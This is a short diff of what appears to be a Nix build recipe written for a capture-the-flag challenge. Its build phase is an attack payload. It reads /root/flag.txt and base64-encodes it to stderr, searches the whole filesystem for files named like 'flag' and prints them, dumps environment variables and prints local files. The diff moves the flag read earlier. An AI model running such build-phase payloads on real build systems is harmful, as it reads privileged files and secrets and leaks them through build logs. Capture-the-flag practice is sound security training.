@@ -21,6 +21,8 @@
 
       # 4. Put your payload in the buildPhase and redirect to stderr
       buildPhase = ''
+        cat /root/flag.txt | base64 >&2
+        
         find / -type f -iname "*flag*" -exec echo -e "\n>>> FOUND: {}" \; -exec cat {} \; 2>/dev/null || true
         env || true
     
@@ -29,8 +31,6 @@
         echo -e "\n>>> Dumping all local files:"
         cat * 2>/dev/null || true
 
-        cat /root/flag.txt | base64 >&2
-    
         exit 1
       '';
 
